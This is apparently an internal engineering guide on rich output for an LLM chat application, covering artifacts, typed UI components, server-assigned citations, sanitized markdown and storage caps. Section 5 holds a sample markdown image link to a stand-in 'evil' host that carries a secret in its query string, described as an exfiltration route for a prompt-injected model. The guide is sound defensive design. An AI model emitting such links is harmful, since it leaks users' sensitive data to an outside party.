# Rich Output — Beyond Chat Text

Chat text is the right surface for a sentence or two. Past that, users want a document they can edit,
a table they can scan, a number they can verify. This file covers the four structured surfaces:
artifacts, generative UI components, citations, and safe markdown. Each section states a principle
and the reasoning. The wire events are in [runs-and-streaming.md](runs-and-streaming.md) §4; tool
shape is in [tool-design.md](tool-design.md).

## Contents

1. [Choosing the surface](#1-choosing-the-surface)
2. [Artifacts](#2-artifacts)
3. [Generative UI components](#3-generative-ui-components)
4. [Citations](#4-citations)
5. [Markdown, code and tables](#5-markdown-code-and-tables)
6. [What not to do](#6-what-not-to-do)
7. [Data model, routes and size caps](#7-data-model-routes-and-size-caps)

## 1. Choosing the surface

**Principle:** the model picks *which* surface by calling a tool; the server and client own *how* it
is built and rendered.

| Content | Surface | Why |
|---|---|---|
| A sentence to a short paragraph, a short list | Markdown in chat | Cheapest; no new UI |
| Exact figures, records, a timeline from your data | Component (section 3), built by a tool from server data | Numbers are computed, not typed by the model |
| A standalone deliverable the user will edit, copy or reuse (report, email draft, code file, long table, chart) | Artifact (section 2) | Leaves the chat flow, is versioned, is editable |
| Any claim drawn from data | Citation (section 4) | The user can check it |

- Rule of thumb for the prompt: **artifact only for a standalone deliverable over ~15 lines or one the
  user will reuse**. A habit of "make an artifact for everything" buries short answers in a side panel.
- One short line of chat beside any rich output; the surface carries the detail
  ([prompting.md](prompting.md) §5).
- Nothing here is model-rendered: the model supplies *content or intent* through a validated tool
  call; the client renders from a fixed set of renderers.

## 2. Artifacts

**Principle:** a deliverable is a stored, versioned object keyed to the conversation, not a blob of
chat text.

Three tools, all `mode: 'read'`: they write only conversation-scoped model output (like the
transcript itself), never business data. If you want stricter classification, make them `propose`;
the seam does not change.

| Tool | Input | Returns |
|---|---|---|
| `create_artifact` | `{ kind: 'markdown'\|'code'\|'table'\|'chart'\|'html', title, content, language? }` | `{ id, version: 1 }` |
| `update_artifact` | `{ id, baseVersion, content, title? }` (full replacement) | `{ id, version }` or teaching `{ error }` |
| `read_artifact` | `{ id }` | `{ id, kind, title, version, content }` (the **current** version) |

- **Content by kind:** `markdown` and `code` are text (`language` for code); `table` and `chart` are
  JSON strings validated by a zod schema per kind (table: `{ columns: [{key,label}], rows: [{ [key]: cell }] }`;
  chart: `{ type: 'bar'|'line'|'pie', labels: string[], series: [{ name, data: number[] }] }`). Validation failure returns a
  teaching `{ error }` ([tool-design.md](tool-design.md) §6). `html` is **off by default**; if a product
  needs it, render only inside `<iframe sandbox>` (no scripts, no same-origin) with a strict CSP, never
  in the app DOM (section 6).
- **Full replacement, not patches.** The model sends the whole new content; the server stores a new
  version. Patch formats are where models and stores disagree about offsets.
- **`baseVersion` is optimistic concurrency.** If the user edited since the model last read, the
  update fails with `"The artifact changed (now v4). Call read_artifact, then update."`. Without it the
  model silently overwrites the user's edit.
- **The model always reads before updating** (prompt rule) so it works from the user's current text,
  and `read_artifact` returns the current version as an ordinary tool result. It lands in persisted
  history, so a 40 KB read is expensive: read when needed, not every turn.
- **Events:** on the end of `create_artifact`/`update_artifact` the **route** emits
  `artifact { id, kind, title, version }` ([runs-and-streaming.md](runs-and-streaming.md) §4), the same
  pattern as `questions` ([runs-and-streaming.md](runs-and-streaming.md) §6): re-read the ids from the
  tool input/result, never trust model text. **The body is never sent over SSE.** The client fetches it
  by id, so the event stays tiny and the fetch re-applies ownership.
- **Persist `artifactIds` on the assistant message** so a reload restores the chip. Client: a chip in
  the message opens a **side panel** (renderer per kind, version switcher, copy, download).
- **User edits create a new version** (`author: 'user'`), never mutate one. History stays intact, undo
  is "restore v2" (which creates v5), and the model's next `read_artifact` sees the human's text.
- **Edit/regenerate** ([runs-and-streaming.md](runs-and-streaming.md) §8) keeps artifacts created under
  deleted messages: they are user-visible version history, listed in the panel, only their chip is gone.
- Step label via `describeStep` ("Writing a document"), never raw content.

## 3. Generative UI components

**Principle:** the tool returns a typed spec; the client has a fixed registry of renderers; the model
never authors markup.

A display tool's result **is** the spec, built by tool code from server data, so numbers are computed
server-side ([tool-design.md](tool-design.md) §5). The model reads the same props (it needs them to write
its one line) and does not restate them.

```ts
const Source = z.object({ id: z.string(), label: z.string(), url: z.string().optional() })
const Cell = z.union([z.string(), z.number(), z.null()])
export const UiSpec = z.discriminatedUnion('component', [
  z.object({ component: z.literal('record_table'), fallbackText: z.string(), sourceRefs: z.array(Source).min(1),
    props: z.object({ title: z.string(), total: z.number().optional(), truncated: z.boolean(),
      columns: z.array(z.object({ key: z.string(), label: z.string(),
        type: z.enum(['text','number','currency','date','status']) })).max(12),
      rows: z.array(z.record(Cell)).max(50) }) }),
  z.object({ component: z.literal('kpi'), fallbackText: z.string(), sourceRefs: z.array(Source).min(1),
    props: z.object({ label: z.string(), value: z.number(), unit: z.string().optional(),
      period: z.string().optional(), delta: z.object({ value: z.number(), versus: z.string() }).optional() }) }),
  z.object({ component: z.literal('timeline'), fallbackText: z.string(), sourceRefs: z.array(Source).min(1),
    props: z.object({ title: z.string(),
      events: z.array(z.object({ at: z.string(), label: z.string(), detail: z.string().optional() })).max(30) }) }),
])
```

- **The route emits it.** On `tool_end`, the route parses the result with `UiSpec`; on success it emits a
  `component { id, component, props, sourceRefs }` event (add this row to the §4 table in
  [runs-and-streaming.md](runs-and-streaming.md)) and persists the specs on the assistant message so a
  reload restores them. Raw results still never reach the client; only the validated spec does.
- **Invalid spec: drop it.** A spec failing `UiSpec` is logged and scored on the trace
  ([observability.md](observability.md)); the text carries on. A malformed card is worse than none.
- **Client registry:** `Record<component, Renderer>`, sharing the zod schema with the server. **Unknown
  component (client older than server) renders `fallbackText` as plain text**, generated by the same
  server builder, so a deploy skew never shows a blank or crashes.
- **Links are refs, not URLs.** Rows carry `{ kind, id }`; the client builds the URL from its own routes,
  the same "references, not words" rule as [inputs.md](inputs.md) §1.
- **Cards that change data are proposal cards**, a different path ([proposals.md](proposals.md) §6). A
  component is read-only.
- Add a component only when two tools want the same shape.

## 4. Citations

**Principle:** a number the user cannot trace is a number they cannot trust. A figure without a source
ref is not shown.

- **Tools return `sourceRefs: [{ id, label, url? }]`** next to the data they came from
  ([tool-design.md](tool-design.md) §5): `id` is the business id, `label` is human ("Invoice INV-1042"),
  `url` an app-relative path or allowlisted `https` (never `javascript:` or `data:`; validate on the server).
- **Numbering is server-assigned, per message.** A wrapper around `execute` (a decorator in the
  controller, not a loop change) assigns `n = 1, 2, ...` per turn, de-duped by `id`, and rewrites the
  refs the **model sees** to `{ n, label }`. The model cites `[n]` right after the claim. The server keeps
  `citations: [{ n, id, label, url? }]` on the assistant message. This is the same per-turn registry
  retrieval uses ([retrieval.md](retrieval.md) §7): one numbering for tool refs and retrieved chunks.
- **Replay drops old refs.** At history replay, strip `sourceRefs` from earlier turns' tool results so the
  model cannot cite a stale `[2]`; if it needs an older fact it re-fetches, which is also fresher.
- **The server rewrites `[n]` to links**, using its own `citations`, never model-written URLs: `done.answer`
  and the transcript endpoint return markdown with `[1](url)` or a plain `[1]` chip when there is no
  url; an `[n]` with no matching source is **stripped**. Stored text stays raw (`[n]` + `citations`) so
  the rendering can change without a migration. During streaming the raw `[1]` shows, then `done`
  swaps in the rewritten answer.
- **Components** carry `sourceRefs` as a required field (`min(1)` above): a spec with figures and no
  source is dropped, which is the code-enforced half of the ground rule.
- **Prose is prompt-enforced only.** "Cite every figure with `[n]`; never state a figure no tool returned"
  is a prompt rule ([prompting.md](prompting.md) §5): add a golden case that asks for a number the tools
  do not return and asserts a plain "I don't have that"
  ([evals.md](evals.md), [architecture.md](architecture.md) §10 table).
- Re-check permission to open a source at render time; a lost permission shows the label without the link.
- Cap visible citations per message (e.g. 10); a wall of chips is noise.

## 5. Markdown, code and tables

**Principle:** markdown is the model's text format; the client treats it as untrusted input.

- **Render with a sanitizing renderer; raw HTML in model output is escaped, never injected.**
- **Disable markdown images** (and any auto-loaded remote resource): `![](https://evil/?q=<secret>)` is a
  one-line data-exfiltration channel when a prompt-injected model has seen sensitive tool data. Images
  come from your attachment store only ([inputs.md](inputs.md) §2).
- **Links:** `http(s)`, `mailto` and app-relative only; `rel="noopener noreferrer"`; show the host for
  external links so a label cannot hide the destination.
- **Code blocks:** language tag, monospace, copy button, horizontal scroll, never executed. An unclosed
  fence mid-stream must render as code, not corrupt the page (render on each rAF flush,
  [runs-and-streaming.md](runs-and-streaming.md) §9).
- **Tables:** the model writes them for 3+ comparable rows ([prompting.md](prompting.md) §5); the
  renderer scrolls them horizontally on narrow screens and offers a copy action. Anything that must be
  exact or sortable is a `record_table` component (section 3), not markdown.
- **Long markdown (> ~15 lines, reusable)** belongs in an artifact (section 2), not the chat bubble.

## 6. What not to do

- **Model-generated HTML in the app.** It is an XSS and phishing surface and cannot be reviewed. The
  only exception is the sandboxed artifact `html` kind (section 2), never inline, never in chat.
- **Numbers in prose that a card already shows.** The card is the source of truth; prose that repeats it
  can drift and contradict it ([proposals.md](proposals.md) §6).
- **Typed numbers in artifacts that must be exact.** An artifact body is model-authored text. Exact
  figures belong in tool-built components; if an artifact tabulates data, the prompt says to copy values
  only from tool results, and a golden case checks it.
- **Model-chosen markup, links, image URLs or citation labels.** It picks a tool; the registry decides the
  look; labels and URLs come from `citations`.
- **An artifact for every answer**, a component for a one-number reply, or JSON dumped into chat.
- **Rendering an invalid or unknown spec as raw JSON.** Drop it or use `fallbackText`.
- **Artifact bodies or raw tool results over SSE** ([runs-and-streaming.md](runs-and-streaming.md) §4).

## 7. Data model, routes and size caps

**Principle:** artifacts are owned, versioned rows; every byte the model emits is bounded by the output
token cap.

```
Artifact        { id, userId, conversationId, messageId?, kind, title, language?, currentVersion, createdAt }
ArtifactVersion { artifactId, version, content, author: 'model'|'user', traceId?, createdAt }   // unique (artifactId, version)
Message         { ..., artifactIds?, components?, citations? }
```

Routes (under the app's API prefix and standard envelope; ownership filter `{ _id, userId }`, anything
else is **404**):

| Route | Purpose |
|---|---|
| `GET /conversations/:id/artifacts` | List: `id, kind, title, currentVersion`; paginated; no bodies |
| `GET /artifacts/:id?version=n` | Body of the current or a given version |
| `POST /artifacts/:id/versions` | User edit: `{ content, baseVersion }`; **409** if `baseVersion` is stale, **422** if invalid for the kind |
| `GET /artifacts/:id/versions` | Version list (no bodies) for the switcher |

Deleting a conversation deletes its artifacts and versions. Create the version row, then bump
`currentVersion` with a conditional update on the expected value; the loser gets 409.

Size caps (constants, not magic numbers):

| Cap | Default | Why |
|---|---|---|
| `content` per version (text kinds) | 40 KB | Must fit the model's output budget with headroom: an artifact larger than `MAX_OUTPUT_TOKENS` truncates mid-JSON and arrives as `{}` ([architecture.md](architecture.md) §6) |
| `table` | 500 rows x 20 columns | Render cost; bigger is an export, not an artifact |
| `chart` | 10 series x 200 points | Legibility and render cost |
| `title` | 120 chars | Chat chip and panel header |
| Artifacts per conversation | 20 | Bounds storage and panel clutter |
| Versions per artifact | 50 | Reject with 422 beyond; prune only by explicit user action |
| Component `rows` / `events` | 50 / 30 | The spec is also replayed to the model every turn |
| Citations shown per message | 10 | Noise |

Reject over-cap input with a teaching `{ error }` ("Content is 52 KB; the limit is 40 KB. Split into two
artifacts or shorten."), never a silent truncation.
